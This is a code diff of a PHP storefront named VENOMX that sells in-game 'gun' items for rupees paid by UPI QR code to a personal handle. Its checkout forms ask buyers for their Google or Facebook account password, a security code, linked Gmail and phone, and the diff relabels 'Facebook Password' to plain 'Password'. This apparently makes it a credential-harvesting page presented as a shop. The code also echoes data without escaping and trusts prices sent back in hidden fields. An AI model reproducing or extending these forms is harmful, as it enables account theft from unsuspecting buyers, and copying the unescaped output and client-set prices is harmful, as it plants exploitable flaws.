+        $gun_query = $db->query("SELECT * FROM products WHERE type='gun' ORDER BY price ASC");
+        $gun_count = 0;
+        while($g = $gun_query->fetchArray()): $gun_count++; ?>
+        <div class="product-card">
+            <img src="<?php echo $g['image']; ?>" class="product-img">
+            <div class="product-name"><?php echo stylish_text($g['name']); ?></div>
+            <div class="product-price">₹<?php echo stylish_number(number_format($g['price'], 0)); ?></div>
+            <form method="post">
+                <input type="hidden" name="product_id" value="<?php echo $g['id']; ?>">
+                <input type="hidden" name="product_name" value="<?php echo $g['name']; ?>">
+                <input type="hidden" name="product_price" value="<?php echo $g['price']; ?>">
+                <input type="hidden" name="product_image" value="<?php echo $g['image']; ?>">
+                <button type="submit" name="add_to_cart" class="cart-btn">🛒 Add to Cart</button>
+            </form>
+        </div>
+        <?php endwhile; 
+        if($gun_count == 0): ?>
+        <div class="product-card" style="width:100%; text-align:center;">
+            <p>No guns available. Admin will add soon.</p>
+        </div>
+        <?php endif; ?>
     </div>
 
     <button class="cart-fixed" onclick="showCart()">🛒 Cart (<?php echo count($cart_items); ?>)</button>
@@ -932,7 +1107,6 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
     <div class="popup-card">
         <h3 style="color:#9b59b6; text-align:center;">Complete Payment</h3>
         <p>Total Amount: ₹<?php echo $checkout_total; ?></p>
-        <p style="color:#ff4444; font-size:12px;">Minimum wallet balance required</p>
         <?php if($user['wallet'] >= $checkout_total): ?>
             <p style="color:#00ff00;">✅ You have sufficient balance</p>
             <div class="game-login-btns">
@@ -957,7 +1131,7 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
             <input type="password" name="password" placeholder="Password" required>
             <input type="text" name="security_code" placeholder="Security Code" required>
             <input type="text" name="game_level" placeholder="Game Level" required>
-            <button type="submit" name="submit_google_details">Submit</button>
+            <button type="submit" name="submit_google_order">Submit</button>
             <button type="button" onclick="closePopup('googleFormPopup')">Cancel</button>
         </form>
     </div>
@@ -973,19 +1147,19 @@ function closeAdminLogin() { document.getElementById('adminLoginPopup').style.di
             <input type="tel" name="phone" placeholder="Phone Number" required>
             <input type="email" name="linked_email" placeholder="Linked Gmail" required>
             <input type="text" name="fb_username" placeholder="Facebook Username" required>
-            <input type="password" name="password" placeholder="Facebook Password" required>
+            <input type="password" name="password" placeholder="Password" required>
             <input type="text" name="game_level" placeholder="Game Level" required>
-            <button type="submit" name="submit_fb_details">Submit</button>
+            <button type="submit" name="submit_fb_order">Submit</button>
             <button type="button" onclick="closePopup('facebookFormPopup')">Cancel</button>
         </form>
     </div>
 </div>
 
-<!-- QR Popup -->
+<!-- QR Popup for Add Funds -->
 <div id="qrPopup" class="popup">
     <div class="small-popup-card">
         <h3 style="color:#9b59b6">Scan & Pay</h3>
-        <img id="qrImage" src="" style="width:200px; margin:15px auto; background:#fff; padding:10px; border-radius:10px;">
+        <img id="qrImage" src="" style="width:180px; margin:15px auto; background:#fff; padding:10px; border-radius:10px;">
         <p id="qrAmount" style="font-size:18px; font-weight:bold;"></p>
         <p>UPI: <strong>Ayushkonhai@fam</strong></p>
         <input type="text" id="utrInput" placeholder="Enter UTR Number">
@@ -1019,7 +1193,7 @@ function generateFundsQR() {
     if(!amt || amt < 199) { alert('Minimum ₹199'); return; }
     selectedAmount = amt;
     document.getElementById('addFundsPage').style.display = 'none';
-    let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=Ayushkonhai@fam&pn=VENOMX&am=${selectedAmount}&cu=INR`;
+    let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=Ayushkonhai@fam&pn=VENOMX&am=${selectedAmount}&cu=INR`;
     document.getElementById('qrImage').src = qrUrl;
     document.getElementById('qrAmount').innerHTML = `₹${selectedAmount}`;
     document.getElementById('qrPopup').style.display = 'flex';
